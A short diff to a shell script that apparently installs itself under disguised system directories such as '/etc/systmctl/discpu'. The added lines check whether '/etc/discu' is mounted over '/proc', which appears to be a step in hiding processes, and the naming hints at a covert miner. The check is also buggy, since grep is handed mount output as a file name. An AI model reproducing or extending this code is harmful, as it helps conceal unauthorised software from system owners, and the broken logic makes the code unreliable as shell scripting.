@@ -13,6 +13,18 @@ if [ -f "/etc/systmctl/discpu/tmpdthmm" ];then
     exit 1
 fi
 
+m=$(mount)
+
+if grep -q "/etc/discu on /proc" "$m"; then
+    echo "runing"
+    exit 1
+else
+    echo "fock"
+fi
+
+
+
+
 mkdir /etc/discu
 mkdir -p /etc/systmctl/discpu
 cd /etc/systmctl/discpu
